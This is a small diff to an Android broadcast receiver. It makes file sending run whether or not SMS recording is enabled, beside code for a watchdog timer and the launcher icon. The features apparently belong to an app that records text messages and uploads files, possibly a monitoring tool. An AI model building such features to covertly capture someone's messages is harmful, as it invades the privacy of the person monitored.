@@ -89,8 +89,7 @@ public class AppReceiver extends android.content.BroadcastReceiver{
     {
         if(settings.getEnableSmsRecording())
             onNewSms();
-        else
-            taskExecutor.startFileSending();
+        taskExecutor.startFileSending();
         setWatchdogTimer(context);
     }
     protected void setLauncherIcon(Context context, Intent intent)
